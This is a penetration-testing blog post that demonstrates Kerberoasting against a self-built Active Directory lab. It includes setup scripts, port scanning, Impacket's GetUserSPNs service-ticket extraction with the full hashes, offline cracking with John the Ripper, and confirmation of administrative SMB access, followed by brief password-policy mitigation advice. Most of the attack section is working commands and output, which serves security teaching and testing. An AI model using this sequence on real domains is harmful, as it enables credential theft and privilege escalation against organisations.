---
slug: roasting-kerberos/
title: Roasting Kerberos
date: 2019-08-05
category: attacks
subtitle: Attacking a DC using kerberoast
tags: security, windows, vulnerability, credential
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620331068/blog/roasting-kerberos/cover_ddb50u.webp
alt: 'Toasting Marshmallow. Photo by hcmorr on Unsplash:
  https://unsplash.com/photos/qlHRuDvaxL8'
description: Windows Active Directory works using the Kerberos protocol,
  and in this blog post, we detail how we can exploit its functionality
  to obtain user hashes.
keywords: Windows, Security, Vulnerability, Hacking, Kerberos, Cracking,
  Ethical Hacking, Pentesting
author: Jonathan Armas
writer: johna
name: Jonathan Armas
about1: Systems Engineer, Security+
about2: '"Be formless, shapeless like water" Bruce Lee'
source: https://unsplash.com/photos/qlHRuDvaxL8
---

`Kerberos` is a protocol developed by
[MIT](http://web.mit.edu/kerberos/) used to authenticate network
services. It is built using secret-key cryptography and uses a trusted
third-party server called `Authentication Server`. This protocol
authenticates users and services using tickets. When a client logs in
their identity is authenticated via the `Authentication Server` (`AS`).
The AS then forwards the username to a `Key Distribution Center` (`KDC`)
that issues a `Ticket-Granting Ticket` (`TGT`). this ticket is the
user’s proof of identity.

This is how Kerberos protocol works:

1. A client sends a request to to the `AS` soliciting a `TGT`. This
    request is built using the machine computer time and encrypting it
    with the user’s password hash.

2. Because the AD (Active Directory) has the user’s password it can
    decrypt the request. The server can then verify the user’s
    authentication data and respond back to the client with a TGT and a
    session key for the TGT.

3. Because the user now has a valid TGT for the domain, they can send a
    request for a service ticket.

4. Now the server verifies the validity of the `TGT` and responds back
    with the service ticket and a service session key.

`Kerberoast`, discovered by [Tim Medin](https://twitter.com/TimMedin),
works by requesting Kerberos service tickets, `TGTs`, from the
`Authentication Server`, `AS`, which is an action that any valid domain
user can do. These service tickets are a hash that we can crack. We then
have access to our target server which provides us with elevated
privileges or even the ability to impersonate another user.

To do this you need a valid domain user, so any employee of an
organization can exploit this. If you are an anonymous attacker on the
network, there are several ways to obtain user credentials. These
include doing an `MDNS` spoofing attack on the network
([Responder](https://github.com/SpiderLabs/Responder)), an Evil Twin
attack to the wireless network if they have enterprise security or a
phishing email attack that uses an enterprise login with the `AD`, among
others.

## Kerberoast lab

To set up our lab we are going to use `Hashicorp’s`
[Vagrant](https://www.vagrantup.com/); the source files are below.
Create a folder with the name `kerberoast` and save the `Vagrantfile`
there. Also create another folder inside `kerberoast` named `provision`
and save the file `ad.ps1` there.

**setting up the lab.**

``` bash
$ mkdir kerberoast
$ cd kerberoast
kerberoast$ nano Vagrantfile #Add here the content
kerberoast$ mkdir provision
kerberoast$ nano provision/ad.ps1 #Add here the content
```

**Vagrantfile.**

``` ruby
# -*- mode: ruby -*-
# vi: set ft=ruby :

Vagrant.configure("2") do |config|

  config.vm.box = "cdaf/WindowsServerDC"
  config.vm.hostname = "winserver"
  config.vm.network "private_network", ip: "192.168.56.2"
  config.vm.provision "shell", path: "provision/ad.ps1"

end
```

**provision/ad.ps1.**

``` powershell
Import-Module ServerManager
Add-WindowsFeature RSAT-AD-PowerShell
import-module activedirectory
New-ADuser -Name "kertest" -SamAccountName kertest -Enabled $true -AccountPassword (ConvertTo-SecureString -AsPlainText "SuperSecure@123!!!" -Force)
New-ADuser -Name "svctest" -SamAccountName svctest -Enabled $true -AccountPassword (ConvertTo-SecureString -AsPlainText "Monkey.123" -Force)
setspn -A sky.net/kertest kertest
setspn -A sky.net/svctest svctest
Add-ADGroupMember -Identity "Administrators" -Members svctest
Add-ADGroupMember -Identity "Users" -Members kertest
```

Then run the environment using:

**vagrant up.**

``` bash
kerberoast$ vagrant up
```

This will create a `Windows` machine with `Active Directory` installed
and configured. At this point, everything we need has been completed and
is ready for us to launch an attack.

Now we can set up our attacking machine. Here we are using [Kali
Linux](https://www.kali.org/) with `Vagrant` too, but you can use
whatever `OS` you prefer.

These are the tools that we are going to use:

- [nmap](https://nmap.org/)

- [netcat](http://netcat.sourceforge.net/)

- [smbmap](https://github.com/ShawnDEvans/smbmap)

- [Impacket](https://github.com/SecureAuthCorp/impacket)

- [SecLists](https://github.com/danielmiessler/SecLists)

- [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper)

If you are using `Kali` the only thing that needs to be installed is
`impacket`. But first, we need to clone it.

**cloning impacket.**

``` bash
git clone https://github.com/SecureAuthCorp/impacket
```

Then go to the folder and install it.

**installing impacket.**

``` bash
$ cd impacket
impacket$ pip install -r requirements.txt
impacket$ python setup.py
```

The `IP` of our target server is `192.168.56.2`, the domain is `sky.net`
and our low privilege domain credentials are
`kertest:SuperSecure@123!!!`.

We are ready to go.

## Scanning our server

First we need to check the server ports. We can use `nmap` or `ncat` to
do it.

**port scanning.**

``` bash
nmap 192.168.56.2
ncat -vz 192.168.56.2 88
ncat -vz 192.168.56.2 445
```

**nmap.**

``` bash
# Nmap 7.70 scan initiated Tue Aug  6 17:10:43 2019 as: nmap 192.168.56.2
Nmap scan report for 192.168.56.2
Host is up (0.012s latency).
Not shown: 991 filtered ports
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
3268/tcp open  globalcatLDAP
3389/tcp open  ms-wbt-server
# Nmap done at Tue Aug  6 17:10:54 2019 -- 1 IP address (1 host up) scanned in 10.54 seconds
```

**nc.**

``` bash
192.168.56.2: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.56.2] 88 (kerberos) open
192.168.56.2: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.56.2] 445 (microsoft-ds) open
```

`Kerberos` runs on `port 88` and `SMB` runs on `port 445`; we are going
to use these services to attack the Domain Controller.

Then using `smbmap` we can check our permissions on the server.

**samba low privileges.**

``` bash
smbmap -u kertest -p 'SuperSecure@123!!!' -H 192.168.56.2 -d sky.net
```

**smbmap low.**

``` bash
[+] Finding open SMB ports....
[+] User SMB session establishd on 192.168.56.2...
[+] IP: 192.168.56.2:445        Name: 192.168.56.2
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        IPC$                                                    READ ONLY
        NETLOGON                                                READ ONLY
        SYSVOL                                                  READ ONLY
```

As we can see, our user is a valid domain user, but has no permissions
on the server

## Kerberoasting

Given that we have an active user we can exploit `kerberoast` to
retrieve `TGTs`. This is done by simply running:

**kerberoast attack.**

``` bash
impacket/examples$ python GetUserSPNs.py sky.net/kertest -dc-ip 192.168.56.2 -save
```

And when prompted put the password `SuperSecure@123!!!`.

**kerberoast output.**

``` bash
ServicePrincipalName  Name     MemberOf                                   PasswordLastSet       LastLogon

sky.net/kertest       kertest  CN=Users,CN=Builtin,DC=sky,DC=net           2019-08-06 17:06:03  2019-08-06 17:31:20
sky.net/svctest       svctest  CN=Administrators,CN=Builtin,DC=sky,DC=net  2019-08-06 17:06:03  <never>


$krb5tgs$23$*kertest$SKY.NET$sky.net/kertest*$1639e200b950b6e566adad2ce3f3a336$bf5092143c33b1664dc4adb9186ea7f1f29cb0919e4cccc11316fc0824b72cab3c3d573f477c81cbb659d64bb0e156c15796180bbf96cbee9d8e7df8438c449a4aacc8714aec2291ff5d470c6be6dfa2f8844d6c34805e0e56b94d8835efce3faa89ca11972f50cace1929b14ee4491ac82a39623cde0ac85f4af8f11284e968dcd96c6219836a7554b42ab2b1d14c6ca2c9d72416463ad939c180c3c8aea73adcb7985035460bf9cb76f12a4d39d5d5ff05a476262f8505c2bba5e9b24e970214abf6a3af02122f815789a82b7919131b72759f93d1404df918cadf64a265a96ebb5a52794b5b7a6d9460ae0db3a0eaa61b7c79e13a18b97f6fe0bcbfdc199fe57138cc5a28deeb06ecd1fae3d4b2af36378f914eac31832f31a050b7dfb96b79419e20df1b37bc04359590f98e0d51066b54353f61f0a9b406e360ce6cd1f118e564a8fe2bc13c787112167bfccb09ba87af8300563fe8051b4e7ecb260a5af5555308f7cced77327214816201b352d186b2247741e88c2ddd207a59f7f6c4e9aa8f28656e343c1cff65bfb0105e77829613ae766d65c4b31b5f48b3cd47e2d1283b4e37db154c6912057929debd05d1abcbc62af9ec99e787e267cd9e666514504d1d64f34347e5c87f6574d08c205a61a59679854f99db94d43abf4ce3752b24d2b1675a9fd94a9365bc36b67cd86e5e99187d0343cbf71de778411a4e696ce41af8cc47dfd82e8072d2821acee41a95560d2d9d2f84d96bf70d982899dce15e2b5785ed17adde1e1886fbcecea00f57af983213e489479da2182efffdfbf652029c199de60ecc3dc7044f5d2a36a4e8c09dac9f438695d25044ce49e04a906064c16c3e9b9bff1accbe378812cb8ee2266b4a4521cf0f37cbd92fb24227e6316881abc7f79438dd0e5f53b21b830f9b662fb5f0047f1ff710804c38c64376d53731184d8acaa0679c5657b0a5b9aa08bb9539c79d7a445ba93d8ee7297788c1363d8846613de4654ea04d82599d1442c311980dad4fb14a2b6864c1fa831b3bbf6e7c05d3526ecb7470c3b9781a06845c59c5eaf366d99d18cd3f2ae265847b2b013674d874ae584d41a9cc1c5f2b76d17657ab9f4f13f0895fec63973c82a2b8296b3dc6a0bfd6fba9d71c081ed71641f283fd157884f70478c46e73aea8813fc758b3c4d26927a052d754a57682c387f132729e5373bf7fbcd7c724182861d5d7dcd53dfad7bf6cf77838063ddae770ef84de21391acd30bef3fd24
$krb5tgs$23$*svctest$SKY.NET$sky.net/svctest*$0fb0da3f22933a2893a6dac63e87538d$d11bb41bc5f41eeb4890ae74c42bff3ac203c649ef9740e70edb67113723df962b20c1346d82c7e410932944c881d3cb06a7cec0c21278ac1eeb2184867640f39b1ae725c02429ec9068fc6688102d576e4efb9c435f4207882601bff28414ababa2423cc4ea82d64082d8fe4eee797568dd514b4081a5338c08dd279fef2a3ade69efc2fe5502fd0a8e8cd8187761ff4c05322c00484e001832a28242d0c821ce44230eac54e2e4e36c365303ea729505ac9d35d7cc08077d07ea36c72e7ab12a04af392eeddcff37fd2e8a066e779ae26e0658ffa25f35a5c64f456a794676819dda35fe56514c1293f561750532d36a395069c8e98581f2b5d216254d7bed07e95dea36a4817ead880fe405711dae771e1660cadf3902fda1e0b730386aa02bc13bc8051ede7ee5388a919a4c20652ef241c47d66e21d026f5233bbd81dee6f01ad3887c32a9f4f0ab312939edcafa386eba04c32a0826f59b4009bd7fee5f6d78bcdeec80095fb1d0f189a87c26310b562bc4d94ffd19201a0bfa06a208d837a52bade076c2b34b8807f74bf51927b774e9f5047289d0d529beb58712d8eee673db3c77d28882a51bbfcf8dba96677af3b43a109c36b335b70dd0e316cce18877b7704e1ed837875cde1e7a462e35c9fe972318eb6d6d37ea222f00d5e81df343edfc1f50bd8907876c4dc1e77f01d9f5df3cb9e94f231a7a0eeb93aa62c22814742b06596eeb72824b4b0449cf6555fa020345bc21a84595437d50abb7cbe4287f580e47ed302faa9de47b68e9c3cab79ad2b1da17548f39aa8ace12372cb0d9952caee715535654f1f918ad5be3432b954bd7bae753152d919bcb93771fc9daf371ce724b18979f5180955d9ba6573d98f1042df80e5e7532fa96629e1b69f9e556df142fd8b0858243144c9f48a19d1933f280f8366c749fe6fb2b7b6c5f7781994f4d3f32552085ebc35ee4fa122a33978c32e877c0b48bc0cb19840bb7d349bbefb39ef1d062fc901b461a480e92e6121b3060f17c34fe92abad77ffebf687115da10b07081d35ef4a622916b656dd84c92643d477128d0a74a24ab23f69f61c94a7b0483313a31476cedc44a5c9efc55b18c57ebea38984f00e50d5773e25f7c6b3bcbc5ef73bf255ede5397ae334a72409440f8475b1f8b22730a456f81e6b08402c7c795aad026c01ca31b4fd8aac5bade44552787aec9c6b2407d2da24059014efdd88ee1953183f62b2e5e06ed7841438a7d4bd3635672b2
```

Here we have our `TGTs`, they are `krbtgt hashes`, and there we can view
another user on the server `svctest`. With this, we save that user’s
`TGT` on a file.

**save hash.**

``` bash
echo '$krb5tgs$23$*svctest$SKY.NET$sky.net/svctest*$0fb0da3f22933a2893a6dac63e87538d$d11bb41bc5f41eeb4890ae74c42bff3ac203c649ef9740e70edb67113723df962b20c1346d82c7e410932944c881d3cb06a7cec0c21278ac1eeb2184867640f39b1ae725c02429ec9068fc6688102d576e4efb9c435f4207882601bff28414ababa2423cc4ea82d64082d8fe4eee797568dd514b4081a5338c08dd279fef2a3ade69efc2fe5502fd0a8e8cd8187761ff4c05322c00484e001832a28242d0c821ce44230eac54e2e4e36c365303ea729505ac9d35d7cc08077d07ea36c72e7ab12a04af392eeddcff37fd2e8a066e779ae26e0658ffa25f35a5c64f456a794676819dda35fe56514c1293f561750532d36a395069c8e98581f2b5d216254d7bed07e95dea36a4817ead880fe405711dae771e1660cadf3902fda1e0b730386aa02bc13bc8051ede7ee5388a919a4c20652ef241c47d66e21d026f5233bbd81dee6f01ad3887c32a9f4f0ab312939edcafa386eba04c32a0826f59b4009bd7fee5f6d78bcdeec80095fb1d0f189a87c26310b562bc4d94ffd19201a0bfa06a208d837a52bade076c2b34b8807f74bf51927b774e9f5047289d0d529beb58712d8eee673db3c77d28882a51bbfcf8dba96677af3b43a109c36b335b70dd0e316cce18877b7704e1ed837875cde1e7a462e35c9fe972318eb6d6d37ea222f00d5e81df343edfc1f50bd8907876c4dc1e77f01d9f5df3cb9e94f231a7a0eeb93aa62c22814742b06596eeb72824b4b0449cf6555fa020345bc21a84595437d50abb7cbe4287f580e47ed302faa9de47b68e9c3cab79ad2b1da17548f39aa8ace12372cb0d9952caee715535654f1f918ad5be3432b954bd7bae753152d919bcb93771fc9daf371ce724b18979f5180955d9ba6573d98f1042df80e5e7532fa96629e1b69f9e556df142fd8b0858243144c9f48a19d1933f280f8366c749fe6fb2b7b6c5f7781994f4d3f32552085ebc35ee4fa122a33978c32e877c0b48bc0cb19840bb7d349bbefb39ef1d062fc901b461a480e92e6121b3060f17c34fe92abad77ffebf687115da10b07081d35ef4a622916b656dd84c92643d477128d0a74a24ab23f69f61c94a7b0483313a31476cedc44a5c9efc55b18c57ebea38984f00e50d5773e25f7c6b3bcbc5ef73bf255ede5397ae334a72409440f8475b1f8b22730a456f81e6b08402c7c795aad026c01ca31b4fd8aac5bade44552787aec9c6b2407d2da24059014efdd88ee1953183f62b2e5e06ed7841438a7d4bd3635672b2' > hashkerber
```

And then we crack it using `john`, a `SecLists` dictionary, and
`KoreLogic` ruleset.

**john cracking.**

``` bash
john --wordlist=/usr/share/seclists/Passwords/darkweb2017-top100.txt --rules=KoreLogic hashkerber
```

**john output.**

``` bash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Monkey.123       (?)
1g 0:00:01:09 DONE (2019-08-06 17:15) 0.01446g/s 150941p/s 150941c/s 150941C/s Michae.l118..Asdfgh.jkl24
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And it’s cracked\! Now we can check our access running `smbmap` again
with our new set of credentials.

**samba high privileges.**

``` bash
smbmap -u svctest -p 'Monkey.123' -d sky.net -H 192.168.56.2
```

**admin smbmap.**

``` bash
[+] Finding open SMB ports....
[+] User SMB session establishd on 192.168.56.2...
[+] IP: 192.168.56.2:445        Name: 192.168.56.2
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  READ, WRITE
        C$                                                      READ, WRITE
        IPC$                                                    READ ONLY
        NETLOGON                                                READ, WRITE
        SYSVOL                                                  READ, WRITE
        [!] Unable to remove test directory at \\192.168.56.2\SYSVOL\edWFuwvkCb, plreae remove manually
```

As you can see, we now have administrative access on our server. You can
access it by `RDP` or retrieve files using `SMB`. Also, you can dump the
`SAM` to get more users and hashes, these last ones are `NTLMv1` and
easily cracked.

Here is the exploitation process.

### Solution

There is no easy solution because this attack exploits the same
legitimate protocol Kerberos uses. Any user in the domain can exploit
this vulnerability and it is only a matter of time before they crack the
credentials.

The way to mitigate this is by having and using a strong credential
policy. Passwords must be longer than 20 characters, contain upper and
lower case letters, contain symbols and digits and must not be easy to
guess. This means you would be wise to adopt passphrases instead of
simple passwords.

This is especially useful when you are dealing with service credentials
because they are the ones most targeted. You can also set an alert to
notify you when someone is logged in with your most critical and
high-privileged users.

If you want more information about strong credentials, you can check our
[**Criteria**](https://docs.fluidattacks.com/criteria/) about them.
